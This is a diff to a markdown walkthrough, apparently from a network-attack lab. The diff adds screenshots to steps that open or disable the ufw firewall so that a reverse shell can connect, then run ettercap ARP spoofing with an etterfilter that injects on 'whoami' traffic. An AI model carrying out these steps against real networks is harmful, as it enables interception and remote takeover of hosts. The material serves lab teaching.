@@ -853,11 +853,15 @@ if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
     - **Disable `ufw`** or create a corresponding allow rule; otherwise, Bob's reverse shell will be blocked by the firewall:
     
         - `ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 666 proto tcp`
-        
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/166804689-87bce1e5-09f7-4d62-b61d-65ad8a3057ba.png)
+     
     - **Or completely disable the firewall by running:** 
     
         - `ufw disable`
-    
+        
+    - ![image](https://user-images.githubusercontent.com/94720207/166804853-62231d5f-4939-49fe-8638-7841df783308.png)
+ 
     - Now, run ettercap specifying your newly created etterfilter file:
     
         - `ettercap -T -i eth1 -M arp -F whoami.ef`
